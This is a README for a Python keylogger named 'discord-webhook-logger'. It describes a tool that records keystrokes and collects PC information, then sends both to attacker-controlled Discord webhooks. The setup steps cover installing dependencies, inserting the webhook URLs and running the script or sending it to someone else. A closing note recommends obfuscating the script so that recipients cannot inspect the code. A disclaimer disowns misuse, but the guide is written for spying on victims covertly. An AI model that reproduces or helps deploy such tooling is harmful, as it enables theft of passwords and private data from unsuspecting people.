# discord-webhook-logger
a simple discord keylogger that also grabs the users pc info, it uses python.

**IMPORTANT NOTE: I DO NOT CONDONE THE USAGE OF THIS SCRIPT AGAISNT OTHERS, ANY DAMAGE DONE IS COMPLETELY ON YOU. FOLLOW DISCORD'S [TERMS OF SERVICE](https://discord.com/terms)**

## setup guide
1. first you have to install the dependencies listed below.
   - [latest version of python](https://www.python.org/downloads/)
   - requests = pip install requests | [enter into cmd]
   - pynput = pip install pynput | [enter into cmd]

2. then right click on the "dwl.pyw" file and open it with notepad, then you will see these two lines of code below.
   - KEYLOG_WEBHOOK_URL = "keylog webhook url here" | between the paranthesis paste in the discord webhook that will send the keylogs to.
   - PCINFO_WEBHOOK_URL = "pc info webhook url here" | between the paranthesis paste in the discord webhook that will send the pc info to.
  
3. next you have to save the file (file - save), and then you can use it by just running it. (or sending it to someone)

### important note:
to stop the script open your task manager and search for "python", click on it and end the task and it will immediately stop the script. also i would **highly** recommend obfuscating the script before sending it to someone so they cannot view the code.
